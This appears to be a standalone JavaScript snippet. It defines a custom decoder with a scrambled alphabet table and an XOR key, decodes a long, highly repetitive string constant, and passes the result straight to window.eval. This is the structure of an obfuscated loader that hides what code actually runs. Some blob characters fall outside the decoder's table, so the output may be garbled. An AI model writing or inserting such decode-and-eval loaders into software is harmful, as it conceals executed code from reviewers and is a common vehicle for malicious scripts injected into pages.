function decodeStage(input) {
  const map = [63,51,52,49,42,19,2,62,6,35,0,0,0,0,0,0,45,32,59,20,13,40,57,60,36,50,29,41,37,46,39,38,44,1,0,30,14,21,56,27,25,24,8,0,0,0,0,23,0,47,53,28,58,9,34,33,16,17,31,55,26,61,18,48,4,10,12,54,3,5,11,22,15,43,7];
  let bits = 0, buf = 0, res = "";
  for (let idx = 0; idx < input.length; idx++) {
    buf |= (map[input.charCodeAt(idx) - 48]) << bits;
    if (bits) {
      res += String.fromCharCode((buf & 0xff) ^ 73);
      buf >>= 8;
      bits -= 2;
    } else {
      bits = 6;
    }
  }
  return res;
}
const blob = "k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@k9@mQ2_vL7~pX4@nR8_wT1~zB6@cH3_jF5~dY0@sA9_eG2~uM7@";
const stage = decodeStage(blob);
window.eval(stage);
